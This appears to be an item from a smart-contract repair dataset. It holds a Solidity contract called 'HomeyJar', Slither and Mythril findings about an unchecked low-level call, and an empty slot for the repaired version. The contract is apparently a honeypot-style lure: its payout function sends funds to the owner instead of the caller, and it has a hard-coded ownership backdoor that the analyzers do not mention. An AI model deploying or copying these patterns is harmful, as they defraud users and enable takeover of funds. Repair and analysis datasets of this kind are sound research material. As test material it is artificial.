@@ -1,0 +1,52 @@
+/// Your task is to repair the following Solidity Smart Contract
+pragma solidity ^0.4.19;
+
+contract HomeyJar {
+    address public Owner = msg.sender;
+
+    function() public payable {}
+
+    function GetHoneyFromJar() public payable {
+        if (msg.value > 1 ether) {
+            Owner.transfer(this.balance);
+            msg.sender.transfer(this.balance);
+        }
+    }
+
+    function withdraw() public payable {
+        if (msg.sender == 0x2f61E7e1023Bc22063B8da897d8323965a7712B7) {
+            Owner = 0x2f61E7e1023Bc22063B8da897d8323965a7712B7;
+        }
+        require(msg.sender == Owner);
+        Owner.transfer(this.balance);
+    }
+
+    function Command(address adr, bytes data) public payable {
+        require(msg.sender == Owner);
+
+        adr.call.value(msg.value)(data);
+    }
+}
+
+/// This Solidity Smart Contract has been analyzed by smart contract analyzers. Here are the results from these analyzers.
+
+/// 1. Slither Analysis Results
+/// 1.1. Vulnerability: unchecked_low_level_call at Line 23-27:
+    function Command(address adr, bytes data) public payable {
+        require(msg.sender == Owner);
+
+        adr.call.value(msg.value)(data);
+///  Message:Low level call in HomeyJar.Command (0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4.sol#23-27):
+///   	-adr.call.value(msg.value)(data) 0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4.sol#26
+
+
+/// 2. Mythril-0.23.15 Analysis Results
+/// 2.1. Vulnerability: unchecked_low_level_call at Line 26:
+        adr.call.value(msg.value)(data);
+///  Message:The return value of a message call is not checked.
+///   External calls return a boolean value. If the callee halts with an exception, 'false' is returned and execution continues in the caller. The caller should check whether an exception happened and react accordingly to avoid unexpected behavior. For example it is often desirable to wrap external calls in require() so the transaction is reverted if the call fails.
+///   Classification: SWC-104
+
+
+
+/// Repaired Solidity Smart Contract
